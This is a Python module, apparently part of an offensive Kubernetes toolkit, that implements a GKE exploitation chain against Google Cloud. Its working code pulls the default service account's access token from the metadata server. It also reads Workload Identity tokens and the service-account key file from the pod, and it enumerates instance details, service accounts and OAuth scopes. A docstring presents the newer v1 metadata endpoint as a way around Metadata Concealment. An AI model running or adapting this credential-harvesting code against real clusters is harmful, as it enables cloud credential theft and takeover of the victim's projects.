"""GCP GKE 利用链

GCP Workload Identity、Metadata Server 访问、GCE Default SA 滥用。
"""

from typing import Optional

from k8s_arsenal.cloud.base import CloudMetadataBase, CloudCredential


class GCPExploit(CloudMetadataBase):
    """GCP GKE 环境利用"""

    METADATA_BASE = "http://metadata.google.internal/computeMetadata/v1"
    METADATA_HEADERS = {"Metadata-Flavor": "Google"}

    def detect(self) -> bool:
        """检测 GCP 环境"""
        # 方法 1: Metadata Server
        resp = self._http_get(
            f"{self.METADATA_BASE}/project/project-id",
            headers=self.METADATA_HEADERS,
        )
        if resp:
            return True

        # 方法 2: DMI
        try:
            with open("/sys/class/dmi/id/product_name", "r") as f:
                if "google" in f.read().lower():
                    return True
        except (FileNotFoundError, PermissionError):
            pass

        return False

    def get_credentials(self) -> Optional[CloudCredential]:
        """获取 GCP 临时凭证

        链式利用:
        1. GKE Metadata Concealment 绕过（新版 metadata 端点）
        2. Compute Engine Default SA Key
        3. Workload Identity Federation
        """
        # 路径 1: GCE Default Service Account
        cred = self._get_default_sa_credentials()
        if cred:
            return cred

        # 路径 2: Workload Identity
        return self._get_workload_identity_credentials()

    def _get_default_sa_credentials(self) -> Optional[CloudCredential]:
        """获取 GCE Default Service Account 凭证

        GKE Metadata Concealment 默认只保护了旧版 v0.1 端点。
        新版 v1/computeMetadata/ 通常仍可访问。
        """
        # 获取 access token
        token = self._http_get(
            f"{self.METADATA_BASE}/instance/service-accounts/default/token",
            headers=self.METADATA_HEADERS,
        )
        if not token:
            return None

        try:
            import json
            token_data = json.loads(token)
            return CloudCredential(
                provider="gcp",
                access_key_id="gcp-sa",
                session_token=token_data.get("access_token"),
                expires_at=str(token_data.get("expires_in", 3600)),
                extra={
                    "token_type": token_data.get("token_type"),
                    "service_account": "default",
                },
            )
        except json.JSONDecodeError:
            pass

        return None

    def _get_workload_identity_credentials(self) -> Optional[CloudCredential]:
        """Workload Identity Federation

        GKE Workload Identity 将 K8s SA 映射到 GCP SA。
        检查是否有挂载的配置。
        """
        import os
        wi_path = "/var/run/secrets/tokens/gcp-ksa"
        if os.path.exists(wi_path):
            try:
                with open(wi_path, "r") as f:
                    token = f.read().strip()
                return CloudCredential(
                    provider="gcp",
                    session_token=token,
                    extra={
                        "source": "workload_identity",
                        "note": "使用 gcloud auth activate-service-account 激活",
                    },
                )
            except (FileNotFoundError, PermissionError):
                pass

        # 检查环境变量
        config_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS")
        if config_path:
            try:
                with open(config_path, "r") as f:
                    import json
                    sa_data = json.load(f)
                return CloudCredential(
                    provider="gcp",
                    extra={
                        "source": "GOOGLE_APPLICATION_CREDENTIALS",
                        "client_email": sa_data.get("client_email"),
                        "project_id": sa_data.get("project_id"),
                    },
                )
            except (FileNotFoundError, PermissionError, json.JSONDecodeError):
                pass

        return None

    def get_instance_info(self) -> dict:
        """获取 GCE 实例信息"""
        info = {}
        fields = [
            "id", "name", "zone", "machine-type",
            "network-interfaces/0/ip", "network-interfaces/0/access-configs/0/external-ip",
            "tags",
        ]
        for field in fields:
            val = self._http_get(
                f"{self.METADATA_BASE}/instance/{field}",
                headers=self.METADATA_HEADERS,
            )
            if val:
                # 取最后一部分作为 key
                key = field.split("/")[-1] if "/" in field else field
                info[key] = val.strip()

        # 获取项目信息
        project = self._http_get(
            f"{self.METADATA_BASE}/project/project-id",
            headers=self.METADATA_HEADERS,
        )
        if project:
            info["project_id"] = project.strip()

        return info

    def list_service_accounts(self) -> list[str]:
        """列出可用的 Service Accounts"""
        resp = self._http_get(
            f"{self.METADATA_BASE}/instance/service-accounts/",
            headers=self.METADATA_HEADERS,
        )
        if resp:
            return [sa.strip("/") for sa in resp.split("\n") if sa]
        return []

    def get_service_account_scopes(self, sa: str = "default") -> list[str]:
        """获取 SA 的 OAuth Scopes"""
        resp = self._http_get(
            f"{self.METADATA_BASE}/instance/service-accounts/{sa}/scopes",
            headers=self.METADATA_HEADERS,
        )
        if resp:
            return [s.strip() for s in resp.split("\n") if s]
        return []


def check_gke_risk(kubeconfig: Optional[str] = None) -> dict:
    """检查 GKE 环境风险"""
    result = {
        "metadata_accessible": False,
        "default_sa_exposed": False,
        "workload_identity_configured": False,
        "risk_level": "none",
        "description": "",
    }

    import os

    # 检查 WI 配置
    if os.path.exists("/var/run/secrets/tokens/gcp-ksa"):
        result["workload_identity_configured"] = True

    if os.environ.get("GOOGLE_APPLICATION_CREDENTIALS"):
        result["workload_identity_configured"] = True

    # 检查 Metadata 可达性
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        if s.connect_ex(("metadata.google.internal", 80)) == 0:
            result["metadata_accessible"] = True
        s.close()
    except Exception:
        pass

    if result["metadata_accessible"] or result["workload_identity_configured"]:
        result["risk_level"] = "high"
        result["default_sa_exposed"] = result["metadata_accessible"]
        result["description"] = "GCP 环境可利用 IMDS 或 Workload Identity 获取云凭证"

    return result
